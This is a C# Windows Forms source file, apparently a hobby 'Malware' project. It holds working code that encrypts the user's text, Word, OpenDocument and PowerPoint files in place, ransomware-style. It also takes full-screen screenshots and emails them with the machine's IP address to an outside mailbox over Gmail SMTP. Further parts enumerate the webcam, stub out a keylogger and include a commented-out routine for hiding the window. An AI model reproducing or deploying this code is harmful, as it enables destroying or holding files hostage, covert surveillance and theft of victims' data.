using System.Security.Cryptography;
using MaterialSkin;
using MaterialSkin.Controls;

// screenshot libraries
using System.Drawing.Imaging;

//video camera libraries
using AForge.Video.DirectShow;

//networkcredentials and mail server
using System.Net;
using System.Net.Mail;
using System.Net.Sockets;



namespace Malware
{
    public partial class MalwareProject : MaterialForm
    {
        string localIP;

        public MalwareProject()
        {
            InitializeComponent();

            this.KeyDown += new KeyEventHandler(MalwareProject_KeyDown);

            var materialSkinManager = MaterialSkinManager.Instance;
            materialSkinManager.AddFormToManage(this);
            materialSkinManager.Theme = MaterialSkinManager.Themes.DARK;
            materialSkinManager.ColorScheme = new ColorScheme(Primary.Red900, Primary.Red800, Primary.BlueGrey500, Accent.LightBlue200, TextShade.WHITE);


            // let's get the IPAdress
            using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
            {
                socket.Connect("8.8.8.8", 65530);
                IPEndPoint endPoint = socket.LocalEndPoint as IPEndPoint;
                localIP = endPoint.Address.ToString();
            }
           


        }
        private List<Keys> keysPressed = new List<Keys>();

        private void MalwareProject_KeyDown(object sender,KeyEventArgs e)
        {
            keysPressed.Add(e.KeyCode);
            if (e.KeyCode == Keys.CapsLock)
            {
                MessageBox.Show("Escape key was pressed.");
            }
        }

        // If you want to invisible program, you can use this part
        //  but the best way of making invisible a program is creating a service in background.
        //protected override void SetVisibleCore(bool value)
        //{
        //    // Hide the form
        //    if (!IsHandleCreated)
        //    {
        //        value = false;
        //        CreateHandle();
        //    }
        //    base.SetVisibleCore(value);
        //}

        private FilterInfoCollection videoDevices;
        private VideoCaptureDevice videoSource;
        // private VideoSourcePlayer videoSourcePlayer;

        private void Form1_Load(object sender, EventArgs e)
        {
            //We took the info of camera devices
            videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);

            if (videoDevices.Count > 0)
            {
                videoSource = new VideoCaptureDevice(videoDevices[0].MonikerString);

                //  videoSourcePlayer.VideoSource = videoSource;


            }
        }


        // It changes the encryption data instead of real data.
        static public bool ByteArrayToFile(string fileName, byte[] byteArray)
        {
            try
            {
                using (var fs = new FileStream(fileName, FileMode.Create, FileAccess.Write))
                {
                    fs.Write(byteArray, 0, byteArray.Length);
                    return true;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Exception caught in process: {0}", ex);
                return false;
            }
        }

        static byte[] EncryptString(string plaintext, byte[] key, byte[] iv)
        {
        
            
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = iv;

                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);

                using (var msEncrypt = new System.IO.MemoryStream())
                {
                    using (var csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                    {
                        using (var swEncrypt = new System.IO.StreamWriter(csEncrypt))
                        {
                            swEncrypt.Write(plaintext);

                        }
                        return msEncrypt.ToArray();
                    }
                }
            }
        }
        static string DecryptString(byte[] ciphertext, byte[] key, byte[] iv)
        {
           
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = iv;

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

                using (var msDecrypt = new System.IO.MemoryStream(ciphertext))
                {
                    using (var csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (var srDecrypt = new System.IO.StreamReader(csDecrypt))
                        {
             
                            return srDecrypt.ReadToEnd();
                        }


                    }



                }
            }
        }
    

        List<string> encryptedFiles = new List<string>();
        List<string> decrpytedFiles = new List<string>();

        //If you want to search all the files which is in current directory. if you add third parameter as 'SearchOption.AllDirectories' to code, it checks subdirectories also.
        string[] textFiles = Directory.GetFiles(Directory.GetCurrentDirectory(), "*.txt");
        string[] docxFiles = Directory.GetFiles(Directory.GetCurrentDirectory(), "*.docx");
        string[] odtFiles = Directory.GetFiles(Directory.GetCurrentDirectory(), "*.odt");
        string[] pptxFiles = Directory.GetFiles(Directory.GetCurrentDirectory(), "*.pptx");

        // I created a list to collect all the file arrays.
        List<String> a = new List<string>();





        private void button1_Click(object sender, EventArgs e)
        {
            var aes = Aes.Create();
            aes.GenerateKey();
            aes.GenerateIV();



            foreach(string x in textFiles)
            {
                a.Add(x);
            }
            foreach (string y in docxFiles)
            {
                a.Add(y);
            }
            foreach (string z in odtFiles)
            {
                a.Add(z);
            }
            foreach (string t in pptxFiles)
            {
                a.Add(t);
            }



            foreach (string ab in a)

            {
                listBox1.Items.Add(ab);
                encryptedFiles.Add(ab);

                string readText = File.ReadAllText(ab);

                MessageBox.Show(ab);

                // Console.WriteLine(readText);
                byte[] encryptedMessage = EncryptString(readText, aes.Key, aes.IV);
                string decryptedMessage = DecryptString(encryptedMessage, aes.Key, aes.IV);
                decrpytedFiles.Add(decryptedMessage);
                ByteArrayToFile(ab, encryptedMessage);

            }


        }

        private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        {
            // Create a Bitmap object from the screen and Create a Graphics object from the Bitmap
            Bitmap bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                              Screen.PrimaryScreen.Bounds.Height,
                                              PixelFormat.Format32bppArgb);

            Graphics gfxScreenshot = Graphics.FromImage(bmpScreenshot);

          
            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
                                         Screen.PrimaryScreen.Bounds.Y,
                                 0, 0,
                                 Screen.PrimaryScreen.Bounds.Size,
                                 CopyPixelOperation.SourceCopy);

            Random rnd = new Random();
            
            bmpScreenshot.Save($"screenshot{rnd.Next()}.png", ImageFormat.Png);
        }

        // Decryption button's click methods
        private void button3_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < encryptedFiles.Count; i++)
            {
                File.WriteAllText(a[i], decrpytedFiles[i]);
            }

        }
      

// let's send all the logs via SMTP

private void button5_Click(object sender, EventArgs e)
        {
            MailMessage message = new MailMessage();
            string messageBody = $"Target IP: {localIP}";
            message.From = new MailAddress("from@gmail.com");
            message.To.Add(new MailAddress("test@protonmail.com"));
            message.Subject = "Erlik Han's LOGS";
            message.Body = messageBody;
            string[] images = Directory.GetFiles(Directory.GetCurrentDirectory(), "*.png");
           
            foreach(string x in images)
            {
                //notes to myself: Attachments method have to take Stream object. Hence I created a MemoryStream and then saved it.
                Image image = Image.FromFile(x);
                MemoryStream imageStream = new MemoryStream();
                image.Save(imageStream, ImageFormat.Jpeg);
                imageStream.Position = 0;
                message.Attachments.Add(new Attachment(imageStream, "image.jpg", "image/jpeg"));

            }
           


            SmtpClient client = new SmtpClient();
            client.Host = "smtp.gmail.com";
            client.Port = 587;
            client.Credentials = new NetworkCredential("from@gmail.com", "credential");
            client.EnableSsl = true;

            client.Send(message);

            message.Dispose();
            client.Dispose();




        }

        // Let's take record of keyboard inputs
        private void button4_Click(object sender, KeyEventArgs e)
        {
             
          

        }

       
    }
}